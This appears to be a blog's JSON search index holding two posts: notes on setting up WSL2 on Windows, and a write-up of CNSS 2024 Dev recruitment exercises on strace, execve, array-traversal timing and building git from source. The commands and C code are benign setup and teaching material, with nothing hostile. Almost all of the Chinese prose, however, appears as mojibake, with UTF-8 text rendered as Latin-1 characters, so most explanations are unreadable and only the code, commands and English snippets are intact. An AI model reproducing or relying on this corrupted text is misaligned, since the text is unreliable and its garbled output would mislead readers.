{"posts":[{"title":"Windows Subsystem for Linux","text":"Penguins would not like open Windows. æœ¬æ–‡è®°å½•äº†æˆ‘å¯åŠ¨ğŸ§WSL2é‡åˆ°çš„å„ç§æŠ¥é”™å’Œé—®é¢˜çš„è§£å†³æ–¹æ³•ã€‚ Windowså®¶åº­ä¸­æ–‡ç‰ˆå‡çº§ä¸ºä¸“ä¸šç‰ˆ1. win11å®¶åº­ç‰ˆè½¬ä¸“ä¸šç‰ˆå¯†é’¥ 2. windows11å®¶åº­ç‰ˆå‡çº§ä¸“ä¸šç‰ˆ æŒ‰ç…§æ–‡ç« 1çš„æ­¥éª¤ï¼Œå¯†é’¥ç¬¬å››ä¸ªå¯ä»¥ï¼Œè¾“å…¥åè‡ªåŠ¨é‡å¯å‡çº§ã€‚å‡çº§åæˆ‘çš„æ˜¾ç¤ºå¯†é’¥æ— æ•ˆæœªæ¿€æ´»ï¼Œåœ¨ç»ˆç«¯ä¸­è¾“å…¥æ–‡ç« 2ç¬¬äºŒæ­¥çš„ä¸‰ä¸ªå‘½ä»¤ï¼ŒæŸ¥çœ‹å‘ç°å‡çº§æˆåŠŸã€‚ å¯ç”¨æˆ–å…³é—­WindowsåŠŸèƒ½ä¸­æ²¡æœ‰Hyper-vWindows æ²¡æœ‰ Hyper-V è§£å†³æ–¹æ¡ˆ WSL2å®‰è£…Linuxå‘è¡Œç‰ˆå¼€å¯ WSL2 å®‰è£… Ubuntu å½“æˆ‘ä¸€åˆ‡å·¥ä½œå‡†å¤‡å°±ç»ªï¼Œä½¿ç”¨wsl --updateå‘½ä»¤å‡çº§åˆ°æœ€æ–°ç‰ˆçš„wslåï¼Œä»ç„¶å‡ºç°äº†é”™è¯¯ã€‚ 1Error code: Wsl/Service/CreateVm/HCS/HCS_E_HYPERV_NOT_INSTALLED Googleåå‘ç°æœ‰äººé‡åˆ°äº†å’Œæˆ‘åŒæ ·çš„é—®é¢˜ï¼Œonomatopellançš„å›ç­”â€œå‹¾é€‰Windows Sandboxé€‰é¡¹â€å¸®åŠ©äº†æˆ‘ã€‚ ä½¿ç”¨ wsl --list --online å‘½ä»¤æŸ¥æ‰¾å¯ç”¨å‘è¡Œç‰ˆåç§°ï¼Œå¹¶ç”¨ wsl --install -d &lt;distribution_name&gt; å®‰è£…ä½ å–œçˆ±çš„ç‰ˆæœ¬ã€‚ ç§»åŠ¨å‘è¡Œç‰ˆçš„å®‰è£…ä½ç½®ã€‚é»˜è®¤æƒ…å†µä¸‹ WSL ä¼šå®‰è£…åœ¨ C ç›˜ä¸­ï¼Œä»è€Œå ç”¨è¾ƒå¤§çš„ç£ç›˜ç©ºé—´ï¼Œå¯ä»¥å°†å…¶ç§»åŠ¨åˆ°å…¶å®ƒä½ç½®ï¼Œä¾‹å¦‚ D:\\WSLä¸‹ã€‚ å¯¼å‡ºåˆ° D ç›˜ä¸­ï¼šwsl --export Ubuntu D:\\WSL\\Ubuntu\\ubuntu.tarï¼› æ³¨é”€å¹¶ç§»é™¤ C ç›˜ä¸­çš„å‘è¡Œç‰ˆï¼šwsl --unregister Ubuntuï¼› å¯¼å…¥åˆ° D ç›˜ä¸­ï¼šwsl --import Ubuntu D:\\WSL\\Ubuntu D:\\WSL\\Ubuntu\\ubuntu.tarã€‚","link":"/2024/07/21/Windows-Subsystem-for-Linux/"},{"title":"CNSS Recruit Dev 2024","text":"â€œDev å¯ä»¥æˆä¸ºä½ åˆ›é€ ä¸‡ç‰©çš„é€”å¾„ä¹‹ä¸€ï¼Œè¿™å°†ä¼´éšå·¨å¤§çš„æˆå°±æ„Ÿã€‚â€ è¢«Guidelineå¸å¼•ï¼Œå‡èšç½‘ç»œå®‰å…¨å·¥ä½œå®¤2024å¹´ğŸ’»Devæ–¹å‘çš„æ‹›æ–°é¢˜ç›®ï¼Œè‡ªå·±çš„wpã€‚ Problems coveredï¼š æ“ä½œç³»ç»Ÿ è®¡ç®—æœºç½‘ç»œ å¹¶è¡Œä¼˜åŒ– Web â€¦ ğŸ¥³MANï¼ä½œä¸ºä¸€åDevæ‰‹ï¼Œå­¦ä¼šæŸ¥æ‰¾å¹¶æµè§ˆå®˜æ–¹æ–‡æ¡£æ˜¯éå¸¸é‡è¦çš„èƒ½åŠ›ã€‚æœ¬é¢˜è¦æ±‚ä½ åˆæ­¥å­¦ä¼šä½¿ç”¨linuxç³»ç»Ÿè‡ªå¸¦çš„ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§çš„æ–‡æ¡£ï¼šman ã€‚(å®é™…ä¸Šæ˜¯manualçš„è‹±æ–‡ç¼©å†™ï¼‰ ä¹‹å‰æ²¡æœ‰ç”¨è¿‡linuxï¼Ÿæ²¡æœ‰å…³ç³»ï¼Œæ¥çœ‹ä¸€ä¸‹è¿™é—¨è¯¾ç¨‹å§ï¼šhttps://missing-semester-cn.github.io/ CH1é¦–å…ˆï¼Œä½ è¦åœ¨ç”µè„‘ä¸Šé…ç½®ä¸€ä¸ªè™šæ‹Ÿç¯å¢ƒï¼Œè¿™é‡Œåˆ—å‡ºå‡ ä¸ªæ–¹æ¡ˆ: åœ¨windowsç¯å¢ƒä¸‹å¯ä»¥ä½¿ç”¨wslï¼ˆæ¯”è¾ƒæ¨èï¼‰ æˆ–è€…å¯ä»¥é…ç½®è™šæ‹Ÿæœº æˆ–è€…æœ‰æ¡ä»¶å¯ä»¥æ‰¾ä¸€å°äº‘æœåŠ¡å™¨æˆ–è€…ä¹°å¦ä¸€å°å®ä½“æœºã€‚ åŒç³»ç»Ÿï¼ˆæ­¥éª¤æ¯”è¾ƒå¤æ‚ï¼‰ å½“æˆ‘ä»¬æœ‰äº†linuxç¯å¢ƒåï¼Œä¸å¦¨åœ¨linuxç¯å¢ƒä¸‹ä½¿ç”¨gccç¼–è¯‘ä¸€ä¸ªè‡ªå·±å†™çš„â€Hello World!â€å¹¶è¿è¡Œï¼ CH2linuxæœ‰ä¸€ä¸ªå¾ˆæœ‰æ„æ€çš„æŒ‡ä»¤ï¼šstraceã€‚åŒæ—¶ï¼Œlinuxä¸­çš„æŒ‡ä»¤(command)ï¼Œç³»ç»Ÿè°ƒç”¨(system call)å’Œåº“å‡½æ•°(library function) åŸºæœ¬éƒ½å¯ä»¥ç”¨man 1 [name], man 2 [name] man 3 [name]æ¥äº†è§£ä»–ä»¬çš„ç”¨æ³•ã€‚ å‡è®¾ä½ åœ¨CH1ä¸­çš„ç¨‹åºåä¸ºhelloã€‚åœ¨åŒç›®å½•ä¸‹è¿è¡Œstrace ./helloã€‚ç»“åˆä½ çœ‹åˆ°çš„manä¸Šå¯¹straceçš„é˜è¿°ï¼Œç®€å•è§£é‡Šä¸‹è¿è¡Œç»“æœã€‚ In the simplest case strace runs the specified command until it exits. It intercepts and records the system calls which are called by a process and the signals which are received by a process. The name of each system call, its arguments and its return value are printed on standard error or to the file specified with the -o option. è¾“å‡ºå±•ç¤ºäº†ç¨‹åºçš„æ‰§è¡Œè¿‡ç¨‹ã€‚ execveè°ƒç”¨hello_worldï¼Œä¼ é€’äº†PATHã€å‚æ•°å’Œ42ä¸ªç¯å¢ƒå˜é‡ï¼›è¿”å›0ï¼ŒæˆåŠŸæ‰§è¡Œã€‚ brkæŸ¥è¯¢ç¨‹åºæ•°æ®æ®µæœ«å°¾ä½ç½®ï¼Œè¿”å›å€¼æ˜¯å½“å‰å†…å­˜åˆ†é…ä½ç½®ï¼Œç”¨äºç®¡ç†å†…å­˜ã€‚ mmapä¸ºç¨‹åºåˆ†é…ä¸€å—å†…å­˜ï¼Œè¿”å›åˆ†é…çš„å†…å­˜åœ°å€ï¼Œç”¨äºè¯»å†™æ“ä½œã€‚ accessåœ¨æ£€æŸ¥æ˜¯å¦å­˜åœ¨ld.so.preloadæ–‡ä»¶ï¼Œè¿”å›é”™è¯¯ï¼Œæ²¡æœ‰æ‰¾åˆ°ã€‚ openatæ‰“å¼€å…±äº«åº“ç¼“å­˜æ–‡ä»¶ï¼ŒæŸ¥æ‰¾ç¨‹åºä¾èµ–çš„å…±äº«åº“ï¼›å½“å‰ç¨‹åºä¾èµ–çš„libcåº“è¢«æ‰“å¼€ï¼Œç¨‹åºè¿”å›3ã€‚ readã€mmapå’Œcloseè¡¨ç¤ºä»åº“ä¸­è¯»å–éœ€è¦çš„æ•°æ®ã€‚ arch_prctlè®¾ç½®çº¿ç¨‹æœ¬åœ°å­˜å‚¨ï¼Œä¸ºå¤šçº¿ç¨‹ç¯å¢ƒæä¾›æ”¯æŒã€‚ï¼ˆä¸æ‡‚ï¼‰ set_tid_addresså’Œset_robust_listç”¨äºçº¿ç¨‹çš„åˆå§‹åŒ–ã€è®¾ç½®çº¿ç¨‹çš„æ ‡è¯†åœ°å€ï¼Œé˜²æ­¢çº¿ç¨‹è¢«æ„å¤–ä¸­æ–­ã€‚ï¼ˆä¹Ÿä¸æ‡‚ï¼‰ mprotectä¿æŠ¤å†…å­˜é¡µé¢çš„æƒé™ï¼Œè®¾ç½®æŸäº›å†…å­˜åŒºåŸŸä¸ºåªè¯»ã€‚ ï¼ˆå¤§çš„è¦æ¥äº†ï¼‰write(1, &quot;hello_world\\n&quot;, 12) = 12ï¼Œé€šè¿‡writeç³»ç»Ÿè°ƒç”¨å‘æ–‡ä»¶æè¿°ç¬¦1å³æ ‡å‡†è¾“å‡ºå†™å…¥12ä¸ªå­—èŠ‚çš„å­—ç¬¦ä¸²ã€‚ exit_groupé¡¾åæ€ä¹‰ï¼Œç»“æŸå¹¶æ­£å¸¸é€€å‡ºã€‚ +++ exited with 0 +++ CH3è¿è¡Œ man 3 execã€‚ä½ èƒ½å†™ä¸€ä¸ªè¿ç”¨åˆ°äº†åº“å‡½æ•°execçš„Cç¨‹åºå—ï¼Ÿ The exec() family of functions replaces the current process image with a new process image. å†™ç¨‹åºè°ƒç”¨execveæ¥æ›¿æ¢å½“å‰çš„è¿›ç¨‹ã€‚CH2çš„ç¬¬ä¸€ä¸ªè°ƒç”¨ã€‚ 123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt; //execveæ‰€åœ¨çš„å¤´æ–‡ä»¶extern char **environ; // å¼•ç”¨å½“å‰è¿›ç¨‹çš„ç¯å¢ƒå˜é‡int main() { // è¦æ‰§è¡Œçš„ç¨‹åºçš„è·¯å¾„ char *program = &quot;/bin/ls&quot;; // å‚æ•° char *args[] = {&quot;ls&quot;, NULL}; // æ‰§è¡Œ execve ç³»ç»Ÿè°ƒç”¨ if (execve(program, args, environ) == -1) { perror(&quot;execve met problems.&quot;); exit(EXIT_FAILURE); // ä½¿ç”¨ EXIT_FAILURE è¡¨ç¤ºå¤±è´¥é€€å‡º } return 0;} ç¼–è¯‘å’Œè¿è¡Œè¿™ä¸ªç¨‹åºã€‚ 12345$ gcc -o execve_exp execve_exp.c$ ./execve_expexecve_exp execve_exp.c hello_world test.c$ lsexecve_exp execve_exp.c hello_world test.c ğŸ˜¶â€ğŸŒ«ï¸Oop Loopå­¦ä¹ cè¯­è¨€çš„æ•°ç»„éƒ¨åˆ†æ—¶ï¼Œæƒ³å‡ºäº†ä¸‰ç§éå†äºŒç»´æ•°ç»„çš„æ–¹æ³•ï¼Œå¹¶æƒ³åŠæ³•æµ‹é‡äº†è¿™ä¸‰ç§æ–¹æ³•æ‰€ä½¿ç”¨çš„æ—¶é—´ã€‚â€è¿™ä¸‰ç§æ–¹æ³•éƒ½è®¿é—®äº†åŒæ ·æ•°é‡çš„æ•°ç»„å…ƒç´ ï¼Œå› æ­¤ä»–ä»¬æ‰€è€—è´¹çš„æ—¶é—´ä¸€å®šæ˜¯å·®ä¸å¤šçš„ã€‚â€œä½†äº‹æƒ…è¿œæ²¡æœ‰è¿™ä¹ˆç®€å•ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/time.h&gt;#include &lt;fcntl.h&gt;#define UNIT_GAP 1000000.0void M_gettimeofday(struct timeval *tv) { int result = gettimeofday(tv, NULL); if(result != 0) { perror(&quot;gettimeofday st\\n&quot;); exit(1); } return ;}#define ArrSize 15000int arr1[ArrSize][ArrSize];int arr2[ArrSize][ArrSize];int arr3[ArrSize][ArrSize];int main() { /* Evaluate iterating pattern 1 */ struct timeval tv_st; M_gettimeofday(&amp;tv_st); for(int i = 0; i &lt; ArrSize; i++) { for(int j = 0; j &lt; ArrSize; j++) { arr1[i][j] += 1; } } struct timeval tv_ed; M_gettimeofday(&amp;tv_ed); double time_gap1 = (double) (tv_ed.tv_sec - tv_st.tv_sec) + ((double) (tv_ed.tv_usec - tv_st.tv_usec) / UNIT_GAP); /* Evaluate iterating pattern 2 */ M_gettimeofday(&amp;tv_st); for(int i = 0; i &lt; ArrSize; i++) { for(int j = 0; j &lt; ArrSize; j++) { arr2[j][i] += 1; } } M_gettimeofday(&amp;tv_ed); double time_gap2 = (double) (tv_ed.tv_sec - tv_st.tv_sec) + ((double) (tv_ed.tv_usec - tv_st.tv_usec) / UNIT_GAP); /* Evaluate iterating pattern 3 */ M_gettimeofday(&amp;tv_st); for(int i = 0; i &lt; ArrSize; i++) { int cap = (ArrSize / 3) * 3; for(int j = 0; j &lt; cap; j+=3) { arr3[i][j] += 1; arr3[i][j + 1] += 1; arr3[i][j + 2] += 1; } for(int j = cap; j &lt; ArrSize; j++) { arr3[i][j] += 1; } } M_gettimeofday(&amp;tv_ed); double time_gap3 = (double) (tv_ed.tv_sec - tv_st.tv_sec) + ((double) (tv_ed.tv_usec - tv_st.tv_usec) / UNIT_GAP); printf(&quot;time spent for time_gap1: %lf seconds\\n&quot;, time_gap1); printf(&quot;time spent for time_gap2: %lf seconds\\n&quot;, time_gap2); printf(&quot;time spent for time_gap3: %lf seconds\\n&quot;, time_gap3);} äº‹å®ä¸Šï¼Œè¿™ä¸‰ç§éå†æ–¹å¼ä½¿ç”¨çš„æ—¶é—´æœ‰æ˜æ˜¾çš„å·®åˆ«ã€‚ CH1å‘ç°æ¯æ¬¡ç¨‹åºçš„è¿è¡Œç»“æœå·®åˆ«éƒ½å¾ˆå¤§ï¼Œå› æ­¤éœ€è¦åå¤è¿è¡Œç¨‹åºå¾ˆå¤šæ¬¡æ‰èƒ½æ‰¾å‡ºä¸åŒéå†æ¨¡å¼ä¸‹çš„æ—¶é—´è§„å¾‹ã€‚è¯·ä½ å¸®ä»–ä¿®æ”¹ç¨‹åºï¼Œè®©ç¨‹åºçš„è¿è¡Œç»“æœéšæœºæ€§æ›´å°ï¼Œè¿™æ ·å°±èƒ½æ‰¾å‡ºæ›´åŠ å¯ä¿¡çš„ç»“è®ºäº†ï¼ å®è·µå‡ºçœŸçŸ¥ï¼Œè·‘ä¸€ä¸‹çœ‹çœ‹ã€‚Oopsï¼Œæ„Ÿè§‰1å’Œ3çš„éšæœºæ€§å¾ˆå¼ºï¼Œ2å‡ ä¹æ˜¯æœ€æ…¢çš„ï¼Œä¸è¿‡ä¹Ÿæœ‰å°‘æ•°ä¾‹å¤–ã€‚ä¸ºäº†å‡å°‘éšæœºæ€§ï¼Œæˆ‘ä»¬å¯ä»¥å¤šæ¬¡è·‘ä»£ç å–å¹³å‡å€¼ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/time.h&gt;#include &lt;fcntl.h&gt;#define UNIT_GAP 1000000.0#define ArrSize 15000#define NUM_RUNS 5 //è¿è¡Œ5æ¬¡å¹¶å–å¹³å‡å€¼void M_gettimeofday(struct timeval *tv) { int result = gettimeofday(tv, NULL); if(result != 0) { perror(&quot;gettimeofday failed\\n&quot;); exit(1); }}int arr1[ArrSize][ArrSize];int arr2[ArrSize][ArrSize];int arr3[ArrSize][ArrSize];int main() { double total_time1 = 0.0, total_time2 = 0.0, total_time3 = 0.0; for(int run = 0; run &lt; NUM_RUNS; run++) { struct timeval tv_st, tv_ed; M_gettimeofday(&amp;tv_st); /* PATTERN 1 */ for(int i = 0; i &lt; ArrSize; i++) { for(int j = 0; j &lt; ArrSize; j++) { arr1[i][j] += 1; } } M_gettimeofday(&amp;tv_ed); double time_gap1 = (double) (tv_ed.tv_sec - tv_st.tv_sec) + ((double) (tv_ed.tv_usec - tv_st.tv_usec) / UNIT_GAP); total_time1 += time_gap1; M_gettimeofday(&amp;tv_st); /* PATTERN 2 */ for(int i = 0; i &lt; ArrSize; i++) { for(int j = 0; j &lt; ArrSize; j++) { arr2[j][i] += 1; } } M_gettimeofday(&amp;tv_ed); double time_gap2 = (double) (tv_ed.tv_sec - tv_st.tv_sec) + ((double) (tv_ed.tv_usec - tv_st.tv_usec) / UNIT_GAP); total_time2 += time_gap2; M_gettimeofday(&amp;tv_st); /* PATTERN 3 */ for(int i = 0; i &lt; ArrSize; i++) { int cap = (ArrSize / 3) * 3; for(int j = 0; j &lt; cap; j += 3) { arr3[i][j] += 1; arr3[i][j + 1] += 1; arr3[i][j + 2] += 1; } for(int j = cap; j &lt; ArrSize; j++) { arr3[i][j] += 1; } } M_gettimeofday(&amp;tv_ed); double time_gap3 = (double) (tv_ed.tv_sec - tv_st.tv_sec) + ((double) (tv_ed.tv_usec - tv_st.tv_usec) / UNIT_GAP); total_time3 += time_gap3; } printf(&quot;Average time spent for time_gap1: %lf seconds\\n&quot;, total_time1 / NUM_RUNS); printf(&quot;Average time spent for time_gap2: %lf seconds\\n&quot;, total_time2 / NUM_RUNS); printf(&quot;Average time spent for time_gap3: %lf seconds\\n&quot;, total_time3 / NUM_RUNS); return 0;} å—¯ï¼Œçœ‹èµ·æ¥æœ‰è§„å¾‹å¤šäº†ï¼š$2&gt;&gt;1&gt;3$ã€‚ CH2è¯•å›ç­”ä¸åŒéå†æ¨¡å¼ä¸‹è¿è¡Œæ—¶é—´çš„å·®åˆ«ï¼Œå¹¶è§£é‡Šä¸ºä»€ä¹ˆä¼šäº§ç”Ÿè¿™äº›å·®åˆ«ã€‚ 1æ˜¯è¡Œä¼˜å…ˆéå†ï¼Œè¿™ä¸Cä¸­è¡Œä¸»åºå­˜å‚¨æ•°ç»„çš„æ–¹å¼ä¸€è‡´ã€‚æ ¹æ®å±€éƒ¨æ€§ï¼ŒCPUå¯ä»¥æœ‰æ•ˆåœ°è¯»å–è¿ç»­çš„å†…å­˜å—ï¼Œå‡å°‘ç¼“å­˜æœªå‘½ä¸­æ¬¡æ•°ï¼Œæé«˜è®¿é—®é€Ÿåº¦ã€‚ è€Œ2æ˜¯åˆ—ä¼˜å…ˆéå†ï¼Œä¸1ç›¸åï¼Œè¿™ç§è®¿é—®æ¨¡å¼å¯¼è‡´å¤§é‡ç¼“å­˜æœªå‘½ä¸­ã€æ•ˆç‡ä½ã€‚ å…³äºåŸç†è§£é‡Šé‚£ä¸€éƒ¨åˆ†ï¼Œåªé cpuç¼“å­˜å…¶å®ä¸å¤ªèƒ½è§£é‡Š ç¬¬ä¸‰ä¸ªpattern è€—æ—¶æ¯”ç¬¬ä¸€ä¸ªpatternå°çš„é—®é¢˜qwqâ€”â€”Shiver 3åˆ™ä½¿ç”¨äº†å¾ªç¯å±•å¼€ä¼˜åŒ–ã€‚æ¯æ¬¡å¤„ç†ä¸‰ä¸ªå…ƒç´ ï¼Œå‡å°‘äº†æ¯æ¬¡æ›´æ–°è¿­ä»£çš„æ§åˆ¶å¼€é”€ï¼Œåœ¨å¤§è§„æ¨¡è¿›è¡Œæ•°ç»„éå†æ—¶ï¼Œä¼šç´¯ç§¯æˆæ˜æ˜¾çš„æ€§èƒ½æå‡ã€‚ å¦å¤–ç”±äºæ•°ç»„å…ƒç´ æ˜¯æ¯ä¸‰ä¸ªè®¿é—®çš„ï¼Œæ›´å®¹æ˜“é¢„å–æ›´å¤šæ•°æ®åˆ°ç¼“å­˜ä¸­ï¼Œè¿›ä¸€æ­¥å‡å°‘äº†ç¼“å­˜æœªå‘½ä¸­çš„æŸå¤±ã€‚ æµæ°´çº¿ä¼˜åŒ–ï¼šç°ä»£å¤„ç†å™¨ä½¿ç”¨æµæ°´çº¿æŠ€æœ¯æ¥æé«˜æŒ‡ä»¤æ‰§è¡Œçš„æ•ˆç‡ã€‚3é€šè¿‡å‡å°‘å¾ªç¯æ¬¡æ•°å’Œå¢åŠ æ¯æ¬¡å¾ªç¯å†…å¤„ç†çš„æ•°æ®é‡ï¼Œå‡å°‘äº†å…¶å®ƒåˆ†æ”¯æŒ‡ä»¤ï¼Œä½¿å¤„ç†å™¨æµæ°´çº¿æ›´é¡ºç•…ã€‚è¿™å¯ä»¥å‡å°‘æµæ°´çº¿åœé¡¿ï¼Œä»è€Œæé«˜æ•´ä½“æ‰§è¡Œé€Ÿåº¦ã€‚ åˆ†æ”¯é¢„æµ‹ï¼šå¾ªç¯çš„æ£€æŸ¥æ¡ä»¶å˜å°‘äº†ï¼Œåˆ†æ”¯é¢„æµ‹é”™è¯¯çš„æ¦‚ç‡ä¹Ÿé™ä½äº†ã€‚ å¯èƒ½å­˜åœ¨çš„å‘é‡åŒ–ä¼˜åŒ–ï¼Ÿç¼–è¯‘å™¨å¯ä»¥è‡ªåŠ¨å°†è¿™ç§æ¯æ¬¡æ“ä½œå¤šä¸ªç›¸é‚»å…ƒç´ è½¬æ¢ä¸ºSIMDæŒ‡ä»¤ã€‚è¿™æ„å‘³ç€å¤„ç†å™¨å¯ä»¥åœ¨ä¸€ä¸ªæŒ‡ä»¤å‘¨æœŸå†…å¯¹å¤šä¸ªæ•°æ®è¿›è¡Œç›¸åŒçš„æ“ä½œï¼Œæå‡è¿ç®—é€Ÿåº¦ã€‚ è¿ç»­è®¿é—®å¤šä¸ªå…ƒç´ æ›´æœ‰å¯èƒ½ä¿æŒå†…å­˜å¯¹é½ï¼Œä»è€Œå‡å°‘é¢å¤–çš„å†…å­˜æ“ä½œå¼€é”€ã€‚ ç”±äºå¾ªç¯ä½“å†…æ“ä½œç›¸äº’ç‹¬ç«‹ï¼Œå¤„ç†å™¨å¯ä»¥å¹¶è¡Œå¤„ç†å¤šä¸ªæ“ä½œï¼Œè¿›ä¸€æ­¥æå‡é€Ÿåº¦ã€‚ â™¿é€ è½®å­ Git æ˜¯ä¸€ä¸ªåˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼Œç”¨äºè·Ÿè¸ªä»£ç æˆ–æ–‡ä»¶çš„æ›´æ”¹ï¼Œå¹¶æ”¯æŒå¤šäººåä½œå¼€å‘ã€‚ ä½ å¯ä»¥åœ¨è¿™é‡Œçœ‹åˆ°gitçš„æºä»£ç : https://github.com/git/git Shiveræƒ³è¦åœ¨è‡ªå·±çš„ç”µè„‘ä¸Šå®‰è£…gitã€‚ ä»¥å‰ï¼Œä»–æ˜¯é€šè¿‡ç³»ç»Ÿçš„è½¯ä»¶åŒ…ç®¡ç†å™¨æ¥å®‰è£…gitçš„ã€‚ä¾‹å¦‚ï¼Œåœ¨ubuntuç³»ç»Ÿä¸­å°±å¯ä»¥ä½¿ç”¨è¿™ä¸¤è¡Œå‘½ä»¤æ¥å®‰è£…gitï¼š 12$ sudo apt update$ sudo apt install git ä½†ä»Šå¤©ï¼Œå®ƒæƒ³æ¢ç‚¹æ–°èŠ±æ ·ã€‚ä»–æƒ³è¦é€šè¿‡æºä»£ç æ¥ç¼–è¯‘gitï¼ gitçš„æºä»£ç å¾ˆå¤šåœ°æ–¹éƒ½æœ‰ï¼Œè¿™é‡Œæ¯”è¾ƒæ¨èä½¿ç”¨githubä¸Šçš„ä»£ç ä»“åº“ï¼Œå¹¶é€šè¿‡git cloneä¸‹è½½ã€‚ï¼ˆä¸è¦åæ§½ä¸ºä»€ä¹ˆç”µè„‘ä¸Šå·²ç»æœ‰gitäº†ä¸ºä¸ºä»€ä¹ˆè¿˜è¦ä¸‹è½½gitæºç ï¼‰ åŒæ—¶ï¼ŒShiverè¿˜é€šè¿‡ä¿®æ”¹æºä»£ç å®ç°äº†ä¿®æ”¹gitè°ƒç”¨ç‰ˆæœ¬ä¿¡æ¯åçš„è¾“å‡ºã€‚ æ€»çš„æ¥è¯´ï¼ŒShiveræƒ³è¦ä½ å®ç°å¦‚ä¸‹çš„æ“ä½œï¼š åœ¨è‡ªå·±çš„ç”µè„‘ä¸Šç¼–è¯‘ git ç¨‹åºï¼Œå¹¶åœ¨æäº¤æ–‡æ¡£ä¸­ç®€å•é˜è¿°è‡ªå·±åœ¨ç¼–è¯‘è¿‡ç¨‹ä¸­é‡åˆ°çš„é—®é¢˜ä¸è‡ªå·±æ˜¯æ€ä¹ˆè§£å†³è¿™äº›é—®é¢˜çš„ã€‚ ä¿®æ”¹ git çš„æºä»£ç ï¼Œä½¿å…¶åœ¨è¾“å‡ºç‰ˆæœ¬ä¿¡æ¯æ—¶ä¼šæœ‰é¢å¤–çš„ &lt;-- CNSS --&gt; æç¤ºï¼ˆä½ ä¹Ÿå¯ä»¥æ·»åŠ è‡ªå·±å–œæ¬¢çš„ä¿¡æ¯ï¼‰å¹¶æˆªå›¾æäº¤ã€‚ï¼ˆè¿™å¯èƒ½éœ€è¦ä½ å…·æœ‰ä¸€å®šçš„ä»£ç é˜…è¯»èƒ½åŠ›ï¼‰ Hintsï¼š æ€ä¹ˆç¼–è¯‘ï¼Ÿè¦ä¸å…ˆä»æ–‡æ¡£å¼€å§‹ï¼Œæ¯”å¦‚æºä»£ç ä¸­çš„README.mdï¼ŒINSTALLæ–‡ä»¶ï¼Ÿ ä»€ä¹ˆæ˜¯cmakeï¼Ÿ Aï¼‰ç¼–è¯‘éœ€è¦ä¾èµ–ï¼Œåœ¨GPTçš„å¸®åŠ©ä¸‹æ€’è£…ä¾èµ–é¡¹ã€‚ 1sudo apt install -y make libssl-dev libcurl4-gnutls-dev libexpat1-dev gettext Bï¼‰è·å–Gitçš„æºç å¹¶ç¼–è¯‘Gitç¨‹åºï¼š 1234git clone git@github.com:git/git.gitmake configure./configure --prefix=/usr/local #æŒ‡å®šå®‰è£…è·¯å¾„ï¼Œé˜²æ­¢å†²çªmake Cï¼‰é‡åˆ°æŠ¥é”™ä¿¡æ¯ï¼š 12345678910/usr/bin/ld: libgit.a(utf8.o): in function `reencode_string_iconv':/home/aununo/CNSS/git/utf8.c:498:(.text+0x10dd): undefined reference to `libiconv'/usr/bin/ld: libgit.a(utf8.o): in function `reencode_string_len':/home/aununo/CNSS/git/utf8.c:593:(.text+0x121d): undefined reference to `libiconv_open'/usr/bin/ld: /home/aununo/CNSS/git/utf8.c:603:(.text+0x1252): undefined reference to `libiconv_close'/usr/bin/ld: /home/aununo/CNSS/git/utf8.c:593:(.text+0x129e): undefined reference to `libiconv_open'/usr/bin/ld: /home/aununo/CNSS/git/utf8.c:603:(.text+0x12c9): undefined reference to `libiconv_close'/usr/bin/ld: /home/aununo/CNSS/git/utf8.c:598:(.text+0x136b): undefined reference to `libiconv_open'collect2: error: ld returned 1 exit statusmake: *** [Makefile:2842: git-daemon] Error 1 å¤§æ¦‚æ˜¯è¯´ç¼ºå°‘ libiconv åº“çš„å¼•ç”¨ã€‚libiconv æ˜¯ä¸€ä¸ªç”¨äºå­—ç¬¦ç¼–ç è½¬æ¢çš„åº“ï¼Œè€Œ Git åœ¨å¤„ç†å­—ç¬¦é›†è½¬æ¢æ—¶ä¾èµ–äºå®ƒã€‚æˆ‘ä»¬ä½¿ç”¨å‘½ä»¤ 123$ ldconfig -p | grep libiconv #æ£€æŸ¥libiconvæ˜¯å¦æˆåŠŸå®‰è£… libiconv_hook.so.1 (libc6,x86-64) =&gt; /lib/x86_64-linux-gnu/libiconv_hook.so.1 libiconv_hook.so (libc6,x86-64) =&gt; /lib/x86_64-linux-gnu/libiconv_hook.so ç³»ç»Ÿä¸Šæœ‰ libiconv_hook.soï¼Œè€Œä¸æ˜¯æ ‡å‡†çš„ libiconv.soã€‚ç”±äº libiconv_hook å¹¶æ²¡æœ‰æä¾› libiconv.so çš„æ ‡å‡†æ¥å£ï¼Œå¯¼è‡´äº†ç¼–è¯‘å’Œæµ‹è¯•æ—¶å‡ºç°é”™è¯¯ã€‚åˆ›å»ºç¬¦å·é“¾æ¥ï¼š 1sudo ln -s /lib/x86_64-linux-gnu/libiconv_hook.so.1 /lib/x86_64-linux-gnu/libiconv.so.2 è®©ç³»ç»Ÿä¸­çš„ libiconv_hook.so æ¨¡æ‹Ÿ libiconv.so.2ï¼ŒéªŒè¯ä¸€ä¸‹ï¼š 12345$ ldconfig -p | grep libiconv libiconv_hook.so.1 (libc6,x86-64) =&gt; /lib/x86_64-linux-gnu/libiconv_hook.so.1 libiconv_hook.so (libc6,x86-64) =&gt; /lib/x86_64-linux-gnu/libiconv_hook.so libiconv.so.2 (libc6,x86-64) =&gt; /usr/local/lib/libiconv.so.2 libiconv.so (libc6,x86-64) =&gt; /usr/local/lib/libiconv.so ç„¶åè¿›è¡Œmakeç¼–è¯‘æˆåŠŸï¼å†å¤ç°ä¸€éã€‚ ä½¿ç”¨çš„ç‰ˆæœ¬åŸºäº 2.46.2ï¼Œå¹¶ä¸”åœ¨æ­¤ç‰ˆæœ¬å‘å¸ƒåæœ‰ 628 æ¬¡æäº¤ã€‚ å½“å‰ç‰ˆæœ¬å¯¹åº”çš„å…·ä½“æäº¤å“ˆå¸Œæ˜¯ 6258f68c3cã€‚ï¼ˆå¤ç°å‰åé¢è¿˜æœ‰ä¸ª.dirtyè¡¨ç¤ºåœ¨å·¥ä½œç›®å½•ä¸­æœ‰æœªæäº¤çš„æ›´æ”¹ï¼‰ Git 